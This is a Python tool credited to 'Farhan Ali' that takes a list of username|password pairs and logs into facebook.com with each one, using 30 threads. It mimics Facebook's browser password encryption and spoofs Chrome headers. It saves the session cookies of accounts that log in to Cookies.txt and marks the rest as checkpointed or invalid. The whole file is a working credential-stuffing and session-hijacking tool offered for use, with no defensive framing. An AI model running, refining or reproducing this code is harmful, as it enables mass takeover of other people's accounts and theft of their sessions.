import re, os, sys, base64, struct, datetime, binascii
from cookiesparser import encode as encode_cookies
from time import sleep
from requests import Session
from pyrua import get_rua
from Cryptodome.Cipher import AES
from Cryptodome import Random
from nacl.public import PublicKey
from nacl.public import SealedBox
from concurrent.futures import ThreadPoolExecutor


class FacebookCookieExtractor:
    def __init__(self):
        self.ids = []
        self.ok = []
        self.cp = []
        self.loop = 0
        self.colors = {"r": "\033[1;31;40m", "g": "\033[1;32;40m", "w": "\033[0;37;40m"}

    def clear_screen(self):
        os.system("cls" if "nt" in os.name else "clear")

    def get_term_size(self):
        return os.get_terminal_size()[0]
    
    def display_logo(self):
        c = self.colors
        print(f"""    ______            __   _
   / ____/___  ____  / /__(_)__  _____
  / /   / __ \\/ __ \\/ //_/ / _ \\/ ___/
 / /___/ /_/ / /_/ / ,< / /  __(__  )
 \\____/\\____/\\____/_/|_/_/\\___/____/
 {c['g']}Coded By Farhan Ali
 @farhaanaliii{c['w']}
{"-" * self.get_term_size()}
""")

    def start(self):
        self.ids.clear()
        self.ok.clear()
        self.cp.clear()
        self.loop = 0
        self.clear_screen()
        self.display_logo()

        file_name = input(f" [{self.colored("g", "+")}] Enter File Name: ")
        try:
            with open(file_name, "r") as file:
                self.ids.extend(file.read().splitlines())
        except Exception as e:
            print(f" [{self.colored("r", "X")}] {str(e)}")
            sleep(1)
            self.start()

        with ThreadPoolExecutor(max_workers=30) as executor:
            for id in self.ids:
                executor.submit(self.process, id)

        print("-" * self.get_term_size())
        print(f" Process Completed\n Cookies saved in Cookies.txt{self.colors['g']}!{self.colors['w']}")
        input(" Press Enter to continue")
        self.start()

    def facebook_web_encrypt_password(self, key_id, pub_key, password, version=5):
        key = Random.get_random_bytes(32)
        iv = bytes([0] * 12)
        timestamp = int(datetime.datetime.now().timestamp())

        aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
        aes.update(str(timestamp).encode('utf-8'))
        encrypted_password, cipher_tag = aes.encrypt_and_digest(password.encode('utf-8'))

        pub_key_bytes = binascii.unhexlify(pub_key)
        seal_box = SealedBox(PublicKey(pub_key_bytes))
        encrypted_key = seal_box.encrypt(key)

        encrypted = bytes([1, key_id, *list(struct.pack('<h', len(encrypted_key))), *list(encrypted_key), *list(cipher_tag), *list(encrypted_password)])
        encrypted = base64.b64encode(encrypted).decode('utf-8')

        return f'#PWD_BROWSER:{version}:{timestamp}:{encrypted}'

    def get_cookies(self, uid, password):
        session = Session()
        session.headers.update({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.facebook.com',
            'priority': 'u=0, i',
            'referer': 'https://www.facebook.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': get_rua(),
        })
        resp = session.get('https://www.facebook.com/login/').text

        matches = re.search(r'\"pubKey\":{"publicKey":"(.+?)","keyId":(\d+?)}}', resp)
        public_key = matches[1]
        key_id = int(matches[2])

        data = {
            "lsd": re.search('name="lsd" value="(.*?)"', resp).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', resp).group(1),
            "login_source": "comet_headerless_login",
            "email": uid,
            "encpass": self.facebook_web_encrypt_password(key_id, public_key, password)
        }
        
        privacy_token = re.search(r'privacy_mutation_token=([^&]+)', resp)
        
        resp = session.post(f'https://www.facebook.com/login/?privacy_mutation_token={privacy_token}', data=data).text
        return encode_cookies(session.cookies.get_dict())
    
    def colored(self, color, text):
        return f"{self.colors[color]}{text}{self.colors["w"]}"
    
    def process(self, id):
        uid, psw = id.split("|")
        try:
            sys.stdout.write(f'\r Processed{self.colored("g", "|")}Total {self.loop}{self.colored("g", "|")}{len(self.ids)} OK{self.colored("g", "|")}CP {len(self.ok)}{self.colored("g", "|")}{len(self.cp)}\r')
            sys.stdout.flush()

            cookies = self.get_cookies(uid, psw)
            if "c_user" in cookies:
                print(f" [{self.colored("g", "OK")}] {uid} | {psw}\n [{self.colors['g']}Cookies{self.colors['w']}] {cookies}")
                with open("Cookies.txt", "a") as file:
                    file.write(f"{uid}|{psw}|{cookies}\n")
                self.ok.append(uid)
            elif "checkpoint" in cookies:
                print(f" [{self.colored("r", "CP")}] {uid} | {psw}")
                self.cp.append(uid)
            else:
                print(f" [{self.colored("r", "Invalid")}] {uid} | {psw}")
            self.loop += 1
        except Exception as e:
            print(e)


if __name__ == "__main__":
    FacebookCookieExtractor().start()
